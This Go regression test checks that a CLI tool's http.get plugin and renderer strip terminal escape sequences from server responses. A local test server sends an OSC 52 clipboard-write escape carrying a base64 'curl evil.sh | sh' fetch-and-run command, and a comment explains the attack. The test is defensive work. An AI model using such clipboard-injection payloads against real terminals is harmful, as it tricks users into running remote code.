package http

import (
	"bytes"
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/this-is-tobi/rule-them-all/internal/render/cli"
	"github.com/this-is-tobi/rule-them-all/pkg/plugin"
)

// A hostile server, the shipped capability, the shipped renderer, nothing
// stubbed in between.
//
// internal/render/cli has the general form of this test over every view type
// and every format; this one exists because the general form does not prove
// the composition. `http.get` puts the response body into a view.Pair
// verbatim — deliberately, that is what it is for — so the whole attack was
// one URL: no plugin to install, no prompt, no grant, nothing the safety
// class would have flagged, since reading a URL is a Read.
//
// OSC 52 is "set the system clipboard to this base64", and terminals honour
// it from anything they print. The payload below decodes to `curl evil.sh |
// sh`, which is what the reader's next paste into a shell would have been.
func TestAServerCannotWriteToTheReadersClipboard(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/plain")
		w.Write([]byte("hello\x1b]52;c;Y3VybCBldmlsLnNoIHwgc2g=\x07"))
	}))
	defer srv.Close()

	var get plugin.Capability
	for _, c := range Plugin().Capabilities {
		if c.ID == "http.get" {
			get = c
		}
	}
	if get.Run == nil {
		t.Fatal("http.get is not in the plugin any more; this test has to follow it")
	}
	v, err := get.Run(context.Background(),
		plugin.NewRequest(plugin.Resolve(get, plugin.Inputs{Caller: map[string]any{"url": srv.URL}}), false, false))
	if err != nil {
		t.Fatal(err)
	}

	// Every format a terminal is likely to see it in.
	for _, f := range []cli.Format{cli.Pretty, cli.Markdown, cli.YAML} {
		var buf bytes.Buffer
		if err := cli.Render(&buf, v, cli.Options{Format: f, NoColor: true, Width: 80}); err != nil {
			t.Fatalf("%s: %v", f, err)
		}
		if strings.ContainsAny(buf.String(), "\x1b\a") {
			t.Errorf("the server's escape reached the terminal as %s:\n%q", f, buf.String())
		}
		// The rest of the body is data and must still be there: a control
		// that also loses the answer is not a control anybody keeps.
		if !strings.Contains(buf.String(), "hello") {
			t.Errorf("%s dropped the body along with the escape: %q", f, buf.String())
		}
	}
}
